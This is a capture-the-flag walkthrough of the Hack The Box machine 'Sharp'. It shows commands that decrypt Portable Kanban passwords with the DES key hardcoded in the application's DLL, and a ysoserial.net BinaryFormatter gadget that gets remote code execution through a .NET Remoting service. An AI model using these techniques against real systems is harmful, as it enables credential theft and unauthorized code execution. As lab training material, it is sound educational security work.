## Overview

Sharp is a Hard Windows machine that is all about old-school .NET internals. The path to `user.txt` is a chain of "encryption that isn't": an anonymous SMB share hands over a *Portable Kanban* install whose stored passwords are DES-encrypted with a key and IV **baked into the application DLL**. Decrypting them gives the password for `lars`, whose own SMB share leaks the credentials and endpoint for a **.NET Remoting** service. That service is configured with `TypeFilterLevel = Full`, meaning it will deserialize any .NET type a client sends — a textbook BinaryFormatter deserialization RCE that lands a shell as `sharp\lars`.

The interesting twist is doing it entirely from Linux. Sharp's remoting service uses Windows "secure mode" authentication, which trips up every off-the-shelf runtime — so we build the client ourselves.

## Recon

| Port | Service |
|------|---------|
| 135  | MSRPC |
| 139/445 | SMB |
| 5985 | WinRM |
| 8888 | .NET Message Framing (.NET Remoting) |

```bash
nmap -sC -sV 10.129.96.64
```

SMB with an anonymous session, WinRM, and a non-standard `.NET Message Framing` service on 8888 are the stand-outs. WinRM is open but none of the credentials we recover actually work against it, which forces the remoting route.

## Enumeration

The SMB server allows a guest/anonymous session, and lists a readable `kanban` share:

```bash
smbclient -N -L //10.129.96.64
smbclient -N //10.129.96.64/kanban -c 'recurse ON; prompt OFF; mget *'
```

The share is a *Portable Kanban* installation. The file `PortableKanban.pk3` is JSON holding each user's `EncryptedPassword`. Portable Kanban "encrypts" these with DES — but the key (`7ly6UznJ`) and IV (`XuVUm5fR`) are hardcoded inside `PortableKanban.Data.dll`, so the ciphertext is effectively plaintext to anyone with the file:

```bash
python3 -c "import json,base64;from Crypto.Cipher import DES;d=json.loads(open('PortableKanban.pk3').read().lstrip('\\ufeff'));[print(u['Name'],':',(lambda p:p[:-p[-1]])(DES.new(b'7ly6UznJ',DES.MODE_CBC,b'XuVUm5fR').decrypt(base64.b64decode(u['EncryptedPassword']))).decode('utf-8','replace')) for u in d['Users'] if u.get('EncryptedPassword')]"
```

![Decrypting PortableKanban credentials](/assets/Images/sharp-001_enum_loot-kanban-creds.png)

That recovers the password for `lars` (and the Portable Kanban "Administrator", which is only the app's own account). `lars` authenticates to SMB and exposes a second share, `dev`:

```bash
smbclient //10.129.96.64/dev -U 'lars%<redacted>' -c 'recurse ON; prompt OFF; mget *'
strings Client.exe | grep -iE 'debug|password|8888|tcp://'
```

`Client.exe` is a .NET binary; its strings reveal the credentials and endpoint for the remoting service on port 8888:

```
tcp://localhost:8888/SecretSharpDebugApplicationEndpoint
debug
<redacted .NET remoting password>
```

![Remoting credentials in Client.exe strings](/assets/Images/sharp-002_enum_loot-remoting-creds.png)

The `debug` account turns out to be a real local Windows account (it authenticates over SMB), which matters for the next step.

## Foothold

The remoting server registers its formatter with `TypeFilterLevel = Full`, so `BinaryFormatter` will fully deserialize any type the authenticated `debug` user sends. A serialized "gadget chain" (ysoserial.net's `TypeConfuseDelegate`) runs a command while it is being reconstructed — classic .NET deserialization RCE.

The catch on Sharp is that the service's secure channel uses Windows NTLM over `NegotiateStream`, and it speaks **raw NTLMSSP, not SPNEGO**. That breaks every common Linux runtime: mono's `NegotiateStream` client auth is unimplemented, WINE's `ntlm_auth` can't export sign/seal keys, and .NET Core only offers SPNEGO. The clean Linux-native fix is to build the client by hand with `impacket` — doing a raw NTLMv2 handshake plus sign/seal, then wrapping the gadget in the .NET Remoting TCP framing.

Generate the gadget under WINE (mono's ysoserial.net throws on this gadget), then send it with the custom client:

```bash
# 1) generate the BinaryFormatter gadget under WINE
WINEPREFIX=~/.wine_dn48 wine ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 \
  -c "cmd /c whoami > C:\\dev\\o.txt 2>&1" > payload.b64

# 2) send it to the secure endpoint with a hand-rolled raw-NTLM NegotiateStream client
python3 sharp_remoting.py 10.129.96.64 8888 \
  tcp://10.129.96.64:8888/SecretSharpDebugApplicationEndpoint debug '<redacted>' payload.b64
```

The box's outbound traffic is filtered, so reverse/HTTP callbacks die — but that doesn't matter. The gadget writes command output into `C:\dev`, which is exactly the `dev` SMB share `lars` can read. So every command's output comes straight back over SMB:

```bash
smbclient //10.129.96.64/dev -U 'lars%<redacted>' -c 'get o.txt'   # -> sharp\lars
```

![Code execution as sharp\lars](/assets/Images/sharp-003_foothold_rce-as-lars.png)

We now have arbitrary command execution as `sharp\lars`.

## User flag

Running `type` on the flag through the same RCE-to-SMB channel:

```bash
# gadget: cmd /c type C:\Users\lars\Desktop\user.txt > C:\dev\o.txt
cat o.txt   # HTB{...}
```

![User flag captured](/assets/Images/sharp-004_foothold_user-flag.png)

Access as `sharp\lars` achieved, and `user.txt` is captured.
